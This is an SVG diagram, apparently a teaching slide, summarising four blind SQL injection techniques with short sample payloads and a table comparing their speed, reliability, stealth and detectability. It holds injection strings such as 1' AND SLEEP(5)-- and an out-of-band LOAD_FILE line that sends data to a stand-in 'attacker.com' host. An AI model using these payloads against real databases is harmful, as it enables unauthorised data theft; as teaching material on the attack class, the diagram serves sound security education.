<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif">
  <defs>
    <marker id="arrow" markerWidth="17.7778" markerHeight="12.6" refX="16" refY="6.3" orient="auto">
      <polygon points="0,18 6.2222,0" fill="#4a90e2" />
    </marker>
  </defs>
  <text x="640" y="54" text-anchor="middle" font-size="28.4444" font-weight="bold" fill="#333">Blind SQL Injection Techniques</text>
  <rect x="53.3333" y="108" width="568.8889" height="126" rx="8.8889" fill="#e8f4f8" stroke="#4a90e2" stroke-width="3.5556" />
  <text x="337.7778" y="153" text-anchor="middle" font-size="21.3333" font-weight="bold" fill="#4a90e2">Boolean-Based Blind</text>
  <text x="337.7778" y="185.4" text-anchor="middle" font-size="17.7778" fill="#333">Different response for TRUE vs FALSE</text>
  <text x="337.7778" y="212.4" text-anchor="middle" font-size="17.7778" fill="#666" font-family="monospace">1' AND 1=1-- (true) vs 1' AND 1=2-- (false)</text>
  <rect x="657.7778" y="108" width="568.8889" height="126" rx="8.8889" fill="#fff3cd" stroke="#ffc107" stroke-width="3.5556" />
  <text x="942.2222" y="153" text-anchor="middle" font-size="21.3333" font-weight="bold" fill="#e6a800">Time-Based Blind</text>
  <text x="942.2222" y="185.4" text-anchor="middle" font-size="17.7778" fill="#333">SLEEP/WAITFOR delays on TRUE</text>
  <text x="942.2222" y="212.4" text-anchor="middle" font-size="17.7778" fill="#666" font-family="monospace">1' AND SLEEP(5)-- (5s delay)</text>
  <rect x="53.3333" y="270" width="568.8889" height="126" rx="8.8889" fill="#f8d7da" stroke="#dc3545" stroke-width="3.5556" />
  <text x="337.7778" y="315" text-anchor="middle" font-size="21.3333" font-weight="bold" fill="#dc3545">Error-Based</text>
  <text x="337.7778" y="347.4" text-anchor="middle" font-size="17.7778" fill="#333">Force errors that leak data</text>
  <text x="337.7778" y="374.4" text-anchor="middle" font-size="17.7778" fill="#666" font-family="monospace">EXTRACTVALUE(1, CONCAT(0x7e,...))</text>
  <rect x="657.7778" y="270" width="568.8889" height="126" rx="8.8889" fill="#d4edda" stroke="#28a745" stroke-width="3.5556" />
  <text x="942.2222" y="315" text-anchor="middle" font-size="21.3333" font-weight="bold" fill="#28a745">Out-of-Band (OOB)</text>
  <text x="942.2222" y="347.4" text-anchor="middle" font-size="17.7778" fill="#333">DNS/HTTP to attacker server</text>
  <text x="942.2222" y="374.4" text-anchor="middle" font-size="17.7778" fill="#666" font-family="monospace">LOAD_FILE('\\\\attacker.com\\...')</text>
  <rect x="106.6667" y="468" width="1066.6667" height="198" rx="8.8889" fill="#e8f4f8" stroke="#4a90e2" stroke-width="2.6667" />
  <text x="640" y="513" text-anchor="middle" font-size="21.3333" font-weight="bold" fill="#333">Technique Comparison</text>
  <text x="248.8889" y="558" text-anchor="middle" font-size="17.7778" font-weight="bold" fill="#4a90e2">Speed</text>
  <text x="497.7778" y="558" text-anchor="middle" font-size="17.7778" font-weight="bold" fill="#4a90e2">Reliability</text>
  <text x="764.4444" y="558" text-anchor="middle" font-size="17.7778" font-weight="bold" fill="#4a90e2">Stealthiness</text>
  <text x="1013.3333" y="558" text-anchor="middle" font-size="17.7778" font-weight="bold" fill="#4a90e2">Detection</text>
  <text x="248.8889" y="603" text-anchor="middle" font-size="17.7778" fill="#333">Boolean: Fast</text>
  <text x="497.7778" y="603" text-anchor="middle" font-size="17.7778" fill="#333">Boolean: High</text>
  <text x="764.4444" y="603" text-anchor="middle" font-size="17.7778" fill="#333">Time: Low</text>
  <text x="1013.3333" y="603" text-anchor="middle" font-size="17.7778" fill="#333">OOB: Hardest</text>
  <text x="248.8889" y="639" text-anchor="middle" font-size="17.7778" fill="#333">Time: Slow</text>
  <text x="497.7778" y="639" text-anchor="middle" font-size="17.7778" fill="#333">OOB: Medium</text>
  <text x="764.4444" y="639" text-anchor="middle" font-size="17.7778" fill="#333">Boolean: Medium</text>
  <text x="1013.3333" y="639" text-anchor="middle" font-size="17.7778" fill="#333">Error: Easiest</text>
</svg>